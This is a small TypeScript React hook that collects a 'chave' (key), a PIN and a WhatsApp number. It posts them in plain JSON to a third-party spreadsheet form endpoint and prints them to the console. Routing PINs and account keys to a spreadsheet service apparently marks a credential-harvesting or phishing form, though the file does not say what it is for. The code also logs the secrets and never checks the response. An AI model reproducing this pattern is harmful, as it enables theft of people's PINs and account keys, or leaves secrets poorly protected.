'use client'

interface formProps {
    chave: string,
    pin: string
}

export function useForm() {

    const setValues = (chave: string, pin: string, whatsapp: string) => {
        const formData = {
            chave,
            pin,
            whatsapp
        }

        async function submitForm(data: formProps) {
            const response = await fetch('https://api.sheetmonkey.io/form/pindzFP9m4ZkfHda1Mmt9h', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            console.table(formData)
        }

        submitForm(formData)
    }

    return { setValues }
}